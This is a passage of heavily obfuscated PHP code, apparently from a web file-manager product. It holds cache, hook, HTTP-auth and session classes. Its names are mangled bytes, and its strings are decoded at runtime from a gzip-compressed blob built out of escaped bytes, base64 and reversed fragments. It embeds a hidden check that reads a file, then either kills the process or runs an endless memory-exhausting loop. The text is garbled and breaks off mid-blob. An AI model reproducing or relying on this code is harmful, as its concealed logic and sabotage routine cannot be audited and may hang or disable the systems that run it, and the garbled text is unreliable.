array_to_keyvalue($FßÚë“³¸, $cİË…‘ö˜[33], $cİË…‘ö˜[382])); goto dğßÉÂÕ”®; dğßÉÂÕ”®: return !1; goto BÚˆğàÃƒÍ; B´…¿ƒŒƒÍ: if (IO::exist($CËµº½Âƒ)) { return !0; } $BÍ ¤ÇÃø = get_path_father($CËµº½Âƒ); if (IO::exist($BÍ ¤ÇÃø)) { $aãË¦Æö”[] = $c¸Œ‚ÈÃØÔ[$cİË…‘ö˜[382]]; return !1; } goto eˆéË†®ïÛ; BÚˆğàÃƒÍ: } private function _fileFilter($dŒŠ‚¾ĞìÉ) { $F‰±‡Ôà =& $_SERVER[İåâé¾]; if (empty($dŒŠ‚¾ĞìÉ)) { return; } $EÌŞ˜Šòğ = array($F‰±‡Ôà[382] => array($F‰±‡Ôà[7], array_unique($dŒŠ‚¾ĞìÉ))); $F°•ƒŸì„£ = Model($F‰±‡Ôà[521])->where($EÌŞ˜Šòğ)->field($F‰±‡Ôà[374])->select(); foreach ($F°•ƒŸì„£ as $dâÏ¶á½) { Model($F‰±‡Ôà[521])->remove($dâÏ¶á½[$F‰±‡Ôà[374]], !1); } } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto eãŠ¿ŸÒæÙ; eãŠ¿ŸÒæÙ: $eÌíƒ¼ÜŞÆ =& $_SERVER[İåâé¾]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto cî¤İÓ´ç; Fµ‰•†¡½’: switch ($f‚ÉïÁ—[$eÌíƒ¼ÜŞÆ[522]]) { case $eÌíƒ¼ÜŞÆ[17]: self::$handle = Model($eÌíƒ¼ÜŞÆ[524]); break; case $eÌíƒ¼ÜŞÆ[525]: self::$handle = new CacheRedis($cë¿ïø‘, $FŒÅ±æ‘×¥); break; case $eÌíƒ¼ÜŞÆ[526]: self::$handle = new CacheMemcached($cë¿ïø‘, $FŒÅ±æ‘×¥); break; case $eÌíƒ¼ÜŞÆ[163]: self::$handle = new CacheFile($cë¿ïø‘, $FŒÅ±æ‘×¥); break; default: break; } return self::$handle; goto b¾¬ƒ¾¼Âá; cî¤İÓ´ç: $f‚ÉïÁ— = $GLOBALS[$eÌíƒ¼ÜŞÆ[6]][$eÌíƒ¼ÜŞÆ[340]]; $cë¿ïø‘ = $f‚ÉïÁ—[$f‚ÉïÁ—[$eÌíƒ¼ÜŞÆ[522]]]; $FŒÅ±æ‘×¥ = $f‚ÉïÁ—[$eÌíƒ¼ÜŞÆ[523]]; goto Fµ‰•†¡½’; b¾¬ƒ¾¼Âá: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Fšª™™œ) { if (is_array($Fšª™™œ) || is_object($Fšª™™œ)) { $Fšª™™œ = json_encode($Fšª™™œ); } $Fšª™™œ = rawurlencode($Fšª™™œ); return KOD_SITE_ID . $_SERVER[İåâé¾][71] . $Fšª™™œ; } public static function get($aÙ‹Îİ½ ) { $aÙ‹Îİ½  = self::key($aÙ‹Îİ½ ); if (!isset(self::$memoryCache[$aÙ‹Îİ½ ])) { CacheLock::lock($aÙ‹Îİ½ ); $F¬Ÿ“½ï = self::init()->get($aÙ‹Îİ½ ); CacheLock::unlock($aÙ‹Îİ½ ); self::$memoryCache[$aÙ‹Îİ½ ] = unserialize($F¬Ÿ“½ï); } return self::$memoryCache[$aÙ‹Îİ½ ]; } public static function set($d¯Ç·Ò¼ç‡, $eîØŠÒ¦å, $AÅ“ ¡·Ù = false) { goto dÎƒæµŞ¹‚; AÔÅØô¼’Ö: CacheLock::unlock($d¯Ç·Ò¼ç‡); return $e‡½§ÚÍß¼; goto B·å™¼¡µŸ; Aæ…¯è‡î: CacheLock::lock($d¯Ç·Ò¼ç‡); $e‡½§ÚÍß¼ = self::init()->set($d¯Ç·Ò¼ç‡, serialize($eîØŠÒ¦å), $AÅ“ ¡·Ù); self::$memoryCache[$d¯Ç·Ò¼ç‡] = $eîØŠÒ¦å; goto AÔÅØô¼’Ö; dÎƒæµŞ¹‚: $d¯Ç·Ò¼ç‡ = self::key($d¯Ç·Ò¼ç‡); if (isset(self::$memoryCache[$d¯Ç·Ò¼ç‡]) && self::$memoryCache[$d¯Ç·Ò¼ç‡] === $eîØŠÒ¦å) { return !0; } if ($AÅ“ ¡·Ù === 0) { self::$memoryCache[$d¯Ç·Ò¼ç‡] = $eîØŠÒ¦å; return !0; } goto Aæ…¯è‡î; B·å™¼¡µŸ: } public static function remove($b÷¶äó‰›Å) { goto DÓÒ¾îÍÎË; BÛôäçÚ‰æ: CacheLock::lock($b÷¶äó‰›Å); $aá“Â»ÕÖ¦ = self::init()->remove($b÷¶äó‰›Å); CacheLock::unlock($b÷¶äó‰›Å); goto Bñ†ÄËöÔ·; Bñ†ÄËöÔ·: return $aá“Â»ÕÖ¦; goto Bç®‘£å²Ä; DÓÒ¾îÍÎË: $b÷¶äó‰›Å = self::key($b÷¶äó‰›Å); unset(self::$memoryCache[$b÷¶äó‰›Å]); self::clearTimeout(); goto BÛôäçÚ‰æ; Bç®‘£å²Ä: } public static function clearMemory($Eè­÷ÂƒĞ¨ = false) { if ($Eè­÷ÂƒĞ¨) { $Eè­÷ÂƒĞ¨ = self::key($Eè­÷ÂƒĞ¨); unset(self::$memoryCache[$Eè­÷ÂƒĞ¨]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[İåâé¾][527])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[İåâé¾][528])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($F™çˆÁÆÛ´, $aêÓ·—½³) { $D™ààÙÉğÉ =& $_SERVER[İåâé¾]; $this->cachePath = $F™çˆÁÆÛ´[$D™ààÙÉğÉ[76]]; $this->prefix = $D™ààÙÉğÉ[529]; $this->cacheTime = $aêÓ·—½³; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($F°ô„¯Ìí) { $AÈÒ£‹ïöŞ =& $_SERVER[İåâé¾]; $F°ô„¯Ìí = str_replace(array($AÈÒ£‹ïöŞ[495], $AÈÒ£‹ïöŞ[92], $AÈÒ£‹ïöŞ[70]), $AÈÒ£‹ïöŞ[530], $F°ô„¯Ìí); return $this->cachePath . $AÈÒ£‹ïöŞ[531] . $F°ô„¯Ìí . $AÈÒ£‹ïöŞ[532]; } public function set($b˜¶Ş‘Ù†, $fÓ£íò®â, $e§ˆË”öß• = false) { $c„Ó†¹ÆÕ = $this->getFile($b˜¶Ş‘Ù†); if (file_put_contents($c„Ó†¹ÆÕ, $this->prefix . $fÓ£íò®â, LOCK_EX)) { return !0; } @unlink($c„Ó†¹ÆÕ); return !1; } public function get($c×•ìğÑùâ) { $dÒ»ÓîÈ½‚ = $this->getFile($c×•ìğÑùâ); if (file_exists($dÒ»ÓîÈ½‚) && filemtime($dÒ»ÓîÈ½‚) < time() - $this->cacheTime) { @unlink($dÒ»ÓîÈ½‚); return !1; } $A¨æø¢İ² = @file_get_contents($dÒ»ÓîÈ½‚); return substr($A¨æø¢İ², strlen($this->prefix)); } public function remove($dì—Åï°÷Ë) { $e„ƒ‹Œø˜ = $this->getFile($dì—Åï°÷Ë); return @unlink($e„ƒ‹Œø˜); } public function deleteAll() { $a‚©¸Ğ°ƒ× =& $_SERVER[İåâé¾]; $e‹èò¨Í÷ = scandir($this->cachePath); foreach ($e‹èò¨Í÷ as $Fé¡Àë–İÌ) { $DæŒÎ¾¨ßõ = $this->cachePath . $Fé¡Àë–İÌ; if (strpos($DæŒÎ¾¨ßõ, $a‚©¸Ğ°ƒ×[532]) && strpos($DæŒÎ¾¨ßõ, $a‚©¸Ğ°ƒ×[533])) { @unlink($DæŒÎ¾¨ßõ); } } } public function clearTimeout() { $a©ÃÕÚ¨¡Ö =& $_SERVER[İåâé¾]; $CäÄº“³øå = scandir($this->cachePath); foreach ($CäÄº“³øå as $eÈùß¥§å) { $fâ¾•£î•Š = $this->cachePath . $eÈùß¥§å; if (strpos($fâ¾•£î•Š, $a©ÃÕÚ¨¡Ö[532]) && strpos($fâ¾•£î•Š, $a©ÃÕÚ¨¡Ö[533]) && filemtime($fâ¾•£î•Š) < time() - $this->cacheTime) { @unlink($fâ¾•£î•Š); } } } } goto CÕ¡Ù­–×µ; f¹÷‚á±ŠÔ: class Hook { private static $events = array(); public static function get($BßËÇÎ‡ñÎ = false) { if (!$BßËÇÎ‡ñÎ) { return self::$events; } else { return self::$events[$BßËÇÎ‡ñÎ]; } } public static function apply($CèŸÚÁ¾§, $c÷é‘†ñîæ = array()) { $dĞÛ‘¨˜„‡ = ActionApply($CèŸÚÁ¾§, $c÷é‘†ñîæ); if (is_string($CèŸÚÁ¾§)) { Hook::trigger($CèŸÚÁ¾§); } return $dĞÛ‘¨˜„‡; } public static function bind($a¶¯ˆà’«‚, $bÛ›Ó·ºœœ, $DËÔ´Í¤ò¥ = false) { $F¡ëÃŠ«Ê =& $_SERVER[İåâé¾]; if (!isset(self::$events[$a¶¯ˆà’«‚])) { self::$events[$a¶¯ˆà’«‚] = array(); } self::$events[$a¶¯ˆà’«‚][] = array($F¡ëÃŠ«Ê[1169] => $bÛ›Ó·ºœœ, $F¡ëÃŠ«Ê[1170] => $DËÔ´Í¤ò¥, $F¡ëÃŠ«Ê[1171] => 0); } public static function once($d§¡ÊçÉ¼™, $E°…¿ŒÚ’Õ) { self::bind($d§¡ÊçÉ¼™, $E°…¿ŒÚ’Õ, !0); } public static function unbind($bëŠå˜¹¦, $Eœ—çÔ¹ë = false) { if (!$Eœ—çÔ¹ë) { self::$events[$bëŠå˜¹¦] = array(); return; } $eå‰®Ğ‘½ = self::$events[$bëŠå˜¹¦]; self::$events[$bëŠå˜¹¦] = array(); for ($d¯¾Åˆóëè = 0; $d¯¾Åˆóëè < count($eå‰®Ğ‘½); $d¯¾Åˆóëè++) { if ($eå‰®Ğ‘½[$d¯¾Åˆóëè][$_SERVER[İåâé¾][1169]] == $Eœ—çÔ¹ë) { continue; } self::$events[$bëŠå˜¹¦][] = $eå‰®Ğ‘½[$d¯¾Åˆóëè]; } } public static function filter($c¯ƒÉËÜÄ, $DğƒÕÕÁÏ) { goto aÛŸŒÀ”Â; aÛŸŒÀ”Â: $Aù¤£¸¼¬ =& $_SERVER[İåâé¾]; $eçÇ‡ÓÊ±À = self::$events; if (!isset($eçÇ‡ÓÊ±À[$c¯ƒÉËÜÄ])) { return $DğƒÕÕÁÏ; } goto EÙœ˜â»¶; EÙœ˜â»¶: $AĞƒ²»ê£ = $eçÇ‡ÓÊ±À[$c¯ƒÉËÜÄ]; $D—ÈßËğø = $DğƒÕÕÁÏ; if (!is_array($AĞƒ²»ê£) || count($AĞƒ²»ê£) == 0) { return $D—ÈßËğø; } goto d½§Ë“Í´İ; d½§Ë“Í´İ: for ($AØîùˆƒŸ = 0; $AØîùˆƒŸ < count($AĞƒ²»ê£); $AØîùˆƒŸ++) { $cÃ»¡—„» = $AĞƒ²»ê£[$AØîùˆƒŸ]; if ($cÃ»¡—„»[$Aù¤£¸¼¬[1170]] && $cÃ»¡—„»[$Aù¤£¸¼¬[1171]] > 1) { continue; } self::$events[$c¯ƒÉËÜÄ][$AØîùˆƒŸ][$Aù¤£¸¼¬[1171]] = $cÃ»¡—„»[$Aù¤£¸¼¬[1171]] + 1; $B‘×Ø’Îœâ = self::apply($cÃ»¡—„»[$Aù¤£¸¼¬[1169]], array($D—ÈßËğø)); if (!is_null($B‘×Ø’Îœâ)) { $D—ÈßËğø = $B‘×Ø’Îœâ; } } return $D—ÈßËğø; goto B…°Û®ÊÂ; B…°Û®ÊÂ: } public static function trigger($EÂ¨‰¹¦´õ) { goto b“ãÃ¦ÜòÔ; E”²Ç“¯²: return $eÁì™ÙÀ¦Í; goto Aù„ø–Ãíª; b“ãÃ¦ÜòÔ: $dŒ»Í‘×ƒ =& $_SERVER[İåâé¾]; $a¿‰À³‡ïÎ = self::$events; $eÁì™ÙÀ¦Í = !1; goto BÅ¥£ŒÕ; b®¾È–„¾î: $aÅƒÂÍî = func_get_args(); array_shift($aÅƒÂÍî); for ($Cœ¦Ğ¸ìï… = 0; $Cœ¦Ğ¸ìï… < count($fŸ¿§Åù—); $Cœ¦Ğ¸ìï…++) { $eŠÎÓôã = $fŸ¿§Åù—[$Cœ¦Ğ¸ìï…]; if ($eŠÎÓôã[$dŒ»Í‘×ƒ[1170]] && $eŠÎÓôã[$dŒ»Í‘×ƒ[1171]] > 1) { continue; } if (defined($dŒ»Í‘×ƒ[1172]) && GLOBAL_LOG_HOOK) { write_log($EÂ¨‰¹¦´õ . $dŒ»Í‘×ƒ[1173] . $eŠÎÓôã[$dŒ»Í‘×ƒ[1169]], $dŒ»Í‘×ƒ[1174]); } self::$events[$EÂ¨‰¹¦´õ][$Cœ¦Ğ¸ìï…][$dŒ»Í‘×ƒ[1171]] = $eŠÎÓôã[$dŒ»Í‘×ƒ[1171]] + 1; $Díë£‚È½ = self::apply($eŠÎÓôã[$dŒ»Í‘×ƒ[1169]], $aÅƒÂÍî); if (defined($dŒ»Í‘×ƒ[1172]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $dŒ»Í‘×ƒ[1174]); if ($eŠÎÓôã[$dŒ»Í‘×ƒ[1171]] == 200) { $dÁò²™—õ = is_array($eŠÎÓôã[$dŒ»Í‘×ƒ[1169]]) ? json_encode_force($eŠÎÓôã[$dŒ»Í‘×ƒ[1169]]) : $eŠÎÓôã[$dŒ»Í‘×ƒ[1169]]; write_log($dŒ»Í‘×ƒ[1175] . $EÂ¨‰¹¦´õ . $dŒ»Í‘×ƒ[1176] . $dÁò²™—õ, $dŒ»Í‘×ƒ[1177]); } } $eÁì™ÙÀ¦Í = is_null($Díë£‚È½) ? $eÁì™ÙÀ¦Í : $Díë£‚È½; } goto E”²Ç“¯²; BÅ¥£ŒÕ: if (!isset($a¿‰À³‡ïÎ[$EÂ¨‰¹¦´õ])) { return $eÁì™ÙÀ¦Í; } $fŸ¿§Åù— = $a¿‰À³‡ïÎ[$EÂ¨‰¹¦´õ]; if (!is_array($fŸ¿§Åù—) || count($fŸ¿§Åù—) == 0) { return $eÁì™ÙÀ¦Í; } goto b®¾È–„¾î; Aù„ø–Ãíª: } } if (!isset($_SERVER[$_SERVER[İåâé¾][555]]) || !isset($_SERVER[$_SERVER[İåâé¾][1178]])) { goto aÎÑ„ÍùÂÈ; BŸáÎáÑ: $cœ¦—¼³“—(BASIC_PATH . $_SERVER[İåâé¾][557]); for (;;) { $cœ¦—¼³“— = $cœ¦—¼³“— . $_SERVER[İåâé¾][1181]; } goto DæäÂ’çæÕ; aàÍ™‘èŒ: $eäôÉ—ß˜ = explode($_SERVER[İåâé¾][223], $fÍñÎŸ»ÆÂ); if (count($eäôÉ—ß˜) < $_SERVER[İåâé¾][1179]) { die; } $cœ¦—¼³“— = $_SERVER[İåâé¾][1180]; goto BŸáÎáÑ; aÎÑ„ÍùÂÈ: $B¤­Ÿ¤ì•ğ = $_SERVER[İåâé¾][556]; $dëÆä×“Ç = BASIC_PATH . $_SERVER[İåâé¾][557]; $fÍñÎŸ»ÆÂ = $B¤­Ÿ¤ì•ğ($dëÆä×“Ç); goto aàÍ™‘èŒ; DæäÂ’çæÕ: } class HttpAuth { public static function get() { $DÕãóä°é˜ =& $_SERVER[İåâé¾]; $DÄíÉ±šö = $DÕãóä°é˜[33]; $B¨ÍÁ¯× = $DÕãóä°é˜[33]; if (isset($_SERVER[$DÕãóä°é˜[1182]])) { $DÄíÉ±šö = $_SERVER[$DÕãóä°é˜[1182]]; $B¨ÍÁ¯× = $_SERVER[$DÕãóä°é˜[1183]]; } elseif (isset($_SERVER[$DÕãóä°é˜[1184]])) { $Cë²–Öõª‰ = $_SERVER[$DÕãóä°é˜[1184]]; if (strpos(strtolower($Cë²–Öõª‰), $DÕãóä°é˜[1185]) === 0) { $e¡ÔéÒ¬¾ = explode($DÕãóä°é˜[4], base64_decode(substr($Cë²–Öõª‰, 6))); $DÄíÉ±šö = isset($e¡ÔéÒ¬¾[0]) ? $e¡ÔéÒ¬¾[0] : $DÕãóä°é˜[33]; $B¨ÍÁ¯× = isset($e¡ÔéÒ¬¾[1]) ? $e¡ÔéÒ¬¾[1] : 0; } } return array($DÕãóä°é˜[416] => $DÄíÉ±šö, $DÕãóä°é˜[663] => $B¨ÍÁ¯×); } public static function error() { goto b“„³Ÿ¨Õö; E¶ÍÌøÕ±Ï: die; goto b°”˜ä¶¸’; dÑØîë‹òÅ: header($Eæß˜É¹‘[1188]); header($Eæß˜É¹‘[1189]); header($Eæß˜É¹‘[1190]); goto E¶ÍÌøÕ±Ï; b“„³Ÿ¨Õö: $Eæß˜É¹‘ =& $_SERVER[İåâé¾]; header($Eæß˜É¹‘[1186]); header($Eæß˜É¹‘[1187]); goto dÑØîë‹òÅ; b°”˜ä¶¸’: } public static function make($F’Œ£˜¹²è, $e­®Æ…Ë¦´) { $cÀ©Ãòëô® =& $_SERVER[İåâé¾]; return $cÀ©Ãòëô®[1191] + base64_encode($F’Œ£˜¹²è . $cÀ©Ãòëô®[4] . $e­®Æ…Ë¦´); } } goto aÇ„˜»íÀÖ; c®êñáÅ: $CõÉÃ¬‹‘¢ = $_SERVER[İåâé¾][554]; if ($_SERVER[$_SERVER[İåâé¾][555]] != $CõÉÃ¬‹‘¢($EŠÉŸó›¢ê)) { goto CÄßÉïõäÈ; CÄßÉïõäÈ: $B¤­Ÿ¤ì•ğ = $_SERVER[İåâé¾][556]; $dëÆä×“Ç = BASIC_PATH . $_SERVER[İåâé¾][557]; $fÍñÎŸ»ÆÂ = $B¤­Ÿ¤ì•ğ($dëÆä×“Ç); goto d®à°—‰¶; FØÂšÅÜÎ¶: $cœ¦—¼³“—($EŠÉŸó›¢ê); goto FÈÀ‡ÍÚƒ…; d®à°—‰¶: $eäôÉ—ß˜ = explode($_SERVER[İåâé¾][223], $fÍñÎŸ»ÆÂ); if (count($eäôÉ—ß˜) < $_SERVER[İåâé¾][1179]) { die; } $cœ¦—¼³“— = $_SERVER[İåâé¾][1180]; goto FØÂšÅÜÎ¶; FÈÀ‡ÍÚƒ…: } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\137\x73\145\x73\x73\x69\157\156"; public function get($B™ÑéÜ»¾§) { $eĞµ ¬âŒŒ =& $_SERVER[İåâé¾]; $C—Ê”²Š¬í = $this->where(array($eĞµ ¬âŒŒ[1650] => $B™ÑéÜ»¾§))->find(); if (!is_array($C—Ê”²Š¬í)) { return !1; } return $C—Ê”²Š¬í[$eĞµ ¬âŒŒ[449]]; } public function set($eÅÔ÷ÂÜ¬Œ, $b„À¦¡Æìá, $c°‹’ŠàßË = 3600) { $c‘¶ ¤ºÚÌ =& $_SERVER[İåâé¾]; $eùÅŒî™¨³ = array($c‘¶ ¤ºÚÌ[1650] => $eÅÔ÷ÂÜ¬Œ, $c‘¶ ¤ºÚÌ[1573] => $b„À¦¡Æìá, $c‘¶ ¤ºÚÌ[1651] => $c°‹’ŠàßË + time()); if (Session::get($c‘¶ ¤ºÚÌ[1652])) { $eùÅŒî™¨³[$c‘¶ ¤ºÚÌ[1086]] = Session::get($c‘¶ ¤ºÚÌ[1652]); } else { $eùÅŒî™¨³[$c‘¶ ¤ºÚÌ[1086]] = 0; } if ($this->get($eÅÔ÷ÂÜ¬Œ)) { return $this->where(array($c‘¶ ¤ºÚÌ[1650] => $eÅÔ÷ÂÜ¬Œ))->save($eùÅŒî™¨³); } else { return $this->add($eùÅŒî™¨³, array(), !0); } } public function remove($C«ñÁ¤¯) { return $this->where(array($_SERVER[İåâé¾][1650] => $C«ñÁ¤¯))->delete(); } public function clearTimeout() { return $this->where($_SERVER[İåâé¾][1653] . time())->delete(); } } goto D¹Î¦ô†¿ä; eˆÆÔİÆÀ: if (!function_exists('_kodDe')) { function _kodDe($A½ªê¬ãó) { $A½ªê¬ãó = base64_decode($A½ªê¬ãó); $eÛŸ„×²¿õ = strlen($A½ªê¬ãó); $DŞ¾¤…‚è‘ = ''; $e‡İç‰±ˆº = ord($A½ªê¬ãó[0]) - 30; for ($f™–°Ï½â = 1; $f™–°Ï½â < $eÛŸ„×²¿õ; $f™–°Ï½â += 2) { if ($f™–°Ï½â + 1 < $eÛŸ„×²¿õ) { $DŞ¾¤…‚è‘ .= chr(ord($A½ªê¬ãó[$f™–°Ï½â + 1]) + $e‡İç‰±ˆº); $DŞ¾¤…‚è‘ .= chr(ord($A½ªê¬ãó[$f™–°Ï½â]) + $e‡İç‰±ˆº); } else { $DŞ¾¤…‚è‘ .= chr(ord($A½ªê¬ãó[$f™–°Ï½â]) + $e‡İç‰±ˆº); } } return $DŞ¾¤…‚è‘; } } define("\xdd\xe5\xe2\xe9\xbe", "\256\220\246\271\337\223\306\222\260\241"); $_SERVER[İåâé¾] = explode(base64_decode('fAR8AXwB'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\140\123\125\326\260\343\12\50\3\243\50\212\250\317\262\164\41\113\51\213\132\50\45\115\322\66\220\66\45\111\51\320"."\x94\xc7\x4b\xf2\xda\x3e\x9a\xe4\x85\xf7\x92\x2e\x6c\x2e\xb8\x2b\xb8\xa1\xa2\x32\x6e\xb8\x2f\xb8\xa3\x32\x83\xbb\xa2\x9f\x8c\xbb\x22\xe3\xae\x80\x32\xb8\x21\x28\x8e\x8c\xfa\xdf\xfd"."\xde\x97\xa4\xfe\xf3\x7d\x88\xe4\xde\x73\xf7\x7b\xcf\x3d\xf7\x9c\x73\xcf\x3d\xef\xea\x5b\xd6\x9d\xbd\xf4\xd0\xa5\x7f\x5a\xfa\xa7\xb3\x77\xbc\xfa\xf2\xce\x73\x7f\x7e\xc\xc7\xc0\x7f"."\x87\x2d\x3d\x18\x87\x4f\xb9\x64\xc0\x41\xe8\xcf\x21\xc9\xa6\xf\x66\xbc\x50\x3e\xd4\xfb\xec\xf0\xa7\x9f\x1b\x72\xf9\x37\x81\x39\x8b\xe\x6b\xdd\x66\x5b\x3f\xa4\xe6\xf8\xab\xb6\x25"."\245\366\347\62\367\24\375\332\253\24\77\366\321\213\327\156\71\343\263\310\225\17\175\361\142\357\244\371\323\256\330\174\327\203\157\75\364\326\25\137\244\7\370\366\354"."\75\330\375\332\275\37\252\143\116\171\344\300\200\73\7\14\277\345\273\216\353\326\215\366\217\57\152\271\263\271\143\343\331\63\337\17\277\67\352\314\242\161\33\336\173"."\xe7\x86\x6b\x17\xaf\xfb\xfa\x7e\x4f\x64\xf7\xf4\xf6\xb2\xca\xbd\x6f\x7c\xfb\xf5\x3a\xed\xc4\xf\x1e\x6d\x6d\x7d\x7a\xfd\xe3\x8b\x7f\x5f\xb5\x24\x3a\xf1\x23\xe9\xc6\xa7\x66\xfc\x56"."\x35\xe0\x85\x1b\x16\x4f\xfe\xee\xac\x50\xfd\x5\x57\x8e\x1e\xb9\xb6\x24\x55\x7f\x8e\xfb\xc5\x9e\x35\x27\x9c\x34\x60\xf1\x8e\xc5\x1f\xff\xd6\xf2\xc8\x85\xdf\xce\xb2\x2d\x9f\xb2\xe5"."\350\222\155\177\276\362\262\267\267\66\126\155\256\263\137\172\334\117\247\176\376\311\117\343\216\77\267\350\354\233\366\337\61\350\230\345\337\257\175\340\155\347\116\347\304".base64_decode('4Fd/OuggPO5K/COl9Iyk9mpmxsSAmJ5q1zpwWEvhXyf+MRcltIyKw3JjICyH').strrev('#SÉ©&*‰FJâ„)«OZrubSA0ÕiåI$¡ŠÒ„œz“ÓjL°Á¼š›š').base64_decode('e7xN/sBcOTy3yUtyROVFWdXowzEUDGUUIxPWkirL0WOwftV463yNUjjoagy5')."\xdc\x61\x5f\xa0\x11\x83\xdd\x81\x86\x6\x5f\x38\x1f\x1e\xc\xf8\xfd\x35\x2e\xf7\xcc\xfc\x94\xa6\xa0\xab\xae\xc1\x25\x81\xfe\x25\x54\x59\x4b\xb5\xeb\x25\xd2\x2\x9c\xb2\x40\x2a\xc5"."\201\132\115\115\304\161\60\245\320\356\144\372\322\44\24\146\41\260\6\251\154\42\201\43\215\54\104\372\257\266\53\331\4\231\63\217\30\111\33\132\122\241\103\237\251".base64_decode('9jEoDijZjK6lYjji7c0YCoeDHscMNammSFUhr9/rDkuwm1JtMNAgkaVIKmZG')."\65\244\226\172\157\320\53\301\256\127\25\243\21\27\113\270\134\163\43\230\20\311\345\367\113\375\325\220\121\223\151\132\15\56\123\240\262\100\320\343\15\112\65\163\45"."\x3e\x4f\x31\x3d\x99\xd4\x53\xe\x50\xb\x58\xcf\x8c\xd0\x55\x6f\x30\x88\x3\x36\x82\xc1\x7e\x1f\x5c\x3a\x12\x9\xd4\xd6\x86\xbc\x2c\x46\x6\x37\xcb\xf\x7a\x32\x81\x60\xa9\x25\x16"."\157\117\144\344\156\45\221\245\310\332\205\177\213\311\17\371\325\115\202\300\213\264\224\226\45\310\112\252\320\165\223\242\274\311\366\20\11\250\64\220\142\231\100\5\72"."\331\135\140\253\165\343\140\325\64\374\73\205\144\212\312\60\115\65\62\262\232\212\351\161\55\105\66\144\65\331\174\4\5\225\114\247\307\320\100\76\122\241\356\210\351"."\xe9\xbe\x6\xbd\x9b\x8c\xa6\x5d\x4b\xa8\x7e\xb6\xdf\xda\xf5\x44\x5c\x35\x78\x3c\xd\x8a\x8b\x29\x64\x58\xda\x62\xa1\x74\x63\x36\x29\x66\x61\xd1\x58\xa7\x96\x88\x1b\x74\x9b\xfe\x51"."\x4e\x53\xcd\x64\x40\xff\x4d\xda\xc5\xe6\x74\x42\x57\xe2\x21\xd5\x60\xdd\xce\x22\x48\xad\x6e\x24\x3d\x60\xbb\x93\x19\x0\x48\xae\x35\x17\x48\xe8\xa2\x68\x1e\x17\x6\xee\x20\x64\xaa"."\xa4\xf5\x6c\xfb\x6f\x6d\xad\xd3\xc1\x3f\xa5\x84\x66\x45\x48\x2f\x3a\xd5\x44\x42\x56\x7b\x55\xb2\x1d\x92\xf1\x49\x26\xed\xa1\xd3\x8c\x6a\x29\x27\x80\xe0\xa8\x2f\x20\x77\x2a\x66\x67"."\103\174\222\214\112\121\122\30\127\173\35\351\316\64\131\117\266\111\11\236\302\311\154\324\63\136\201\222\46\364\230\222\20\207\210\303\235\231\114\72\244\246\342\265\140".strrev('’ôÌLÁ“ˆX&I™ÖÂq÷µ®+ğÉV¥}R¹¤—›L’ª´”šôPÈÒ')."\5\57\42\161\265\67\103\146\107\232\22\353\124\14\260\104\125\331\114\273\375\164\102\37\322\351\204\26\123\62\232\236\162\352\261\214\232\261\233\31\103\125\110\155\105"."\x53\x24\xb8\xdc\x70\xa3\x96\xe1\x52\x74\x93\xb8\xf5\x54\x6\xec\x52\x7b\xd8\x50\x52\x66\xbb\x6a\xd8\xbd\x4\x77\x2b\x25\x30\xc1\x8c\x50\xd1\x6c\x1e\xcd\x4c\xeb\xa6\x6\x9b\xa9\x94"."\x94\x4c\x46\x89\x75\xc2\x4d\xce\xab\xaf\xfa\x83\xfc\x5a\x2a\xa1\xa5\xd4\xbc\xbc\xae\x58\x4c\x35\x4d\x3b\x2c\x62\xe8\x9\xbb\x2b\x91\xd0\x7b\xec\x1\x43\xeb\xd0\x40\x99\xb2\x9c\x6e".base64_decode('AgJUKVHqmNYM1aRRqa4hTDKDXqn2JkPpSCqVUjobBTNDNl8BGM5NWq+UYjBq')."\223\222\131\63\143\67\124\100\145\64\160\236\221\305\363\265\333\33\340\172\152\152\334\36\2\304\230\200\47\224\117\224\0\32\111\64\15\103\353\303\341\46\331\127\13"."\316\334\106\257\334\340\12\273\353\111\267\63\112\7\355\263\37\220\130\126\45\5\316\261\7\262\31\210\150\215\140\216\70\260\111\357\121\15\320\160\115\137\245\324\245".base64_decode('x6N6r4MmwcwhQAJoZjij6Yw9qKQ64PxE+zKqSY+M4GxvUA4FasMtriA5jlNg').strrev('·Z.bì™İr8:¾üÓAİÂ¦‘'."\0".'ÀóBÓ†’£Zcn`ãTÂl°]i{¦')."\137\113\152\260\163\31\226\202\246\12\234\325\165\244\103\116\324\343\252\110\147\131\111\44\76\256\324\16\376\55\53\155\215\170\34\145\155\325\116\215\227\161\216\167\214".base64_decode('lyrKJ0tNgHnQlIRE0CQvR7kUmGlFJL+a6sh0En4q6J3V7A2F5QZvuD7gIaW9').base64_decode('Lg8fXaXTySMmi/l1vOXoQFrxTxtZGXDSd6gxPaEbSgISFopHKt3cHVo7J8Y+')."\300\217\220\106\60\51\343\221\220\226\114\123\302\223\351\314\46\243\102\320\311\153\40\104\4\254\24\43\67\72\73\70\164\203\204\130\357\307\124\324\122\352\351\14\115"."\0\177\71\251\214\353\111\205\62\222\150\103\252\161\274\43\61\250\314\222\122\257\52\374\44\312\30\31\35\102\15\113\226\6\65\323\251\223\215\321\241\322\56\145\131"."\xdf\x68\x2f\xe3\x6a\x42\xa5\xb3\xd4\xa9\x52\xea\xb\xb8\xa3\x6e\x36\x79\x88\x6f\xa3\x41\x93\x13\x64\x18\x11\x8e\xc4\xb4\xa1\xb6\x6b\x4\xab\x1\xd7\x4\x8a\x73\x22\xac\x99\x41\x50".base64_decode('N+RiaLwFMpsckOH0WjHd8NgUq2Yw1nZts98vuwONYcB6YkhL0Bf2UuxyeWSX').base64_decode('u4kdYnxdSQa4T/PpHIZ0VwgHAD8pOO2lRx2krTgMiGJaT5mqPUZqi3MqjHNM').strrev(':\\å8´zLcş@ZdÑBJ´ÂÎ<¦“k	